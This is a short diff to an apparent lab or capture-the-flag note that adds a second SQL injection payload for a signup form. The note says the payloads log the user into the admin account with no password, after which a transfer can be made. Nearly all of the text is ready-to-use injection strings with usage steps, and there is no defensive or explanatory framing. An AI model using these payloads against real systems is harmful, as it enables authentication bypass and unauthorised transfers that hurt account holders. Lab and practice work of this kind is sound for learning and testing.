@@ -2,7 +2,8 @@ ORIGINALLY INTENDED :
 
 In signup form :
 
-dummy';select * from accounts where username='admin
+1st. dummy' or username='admin' order by username desc limit '1
+2nd. dummy';select * from accounts where username='admin
 
 This will log us onto the admin accounts without any password requirements. (Press F5 once logged)
 Then you can transfer.
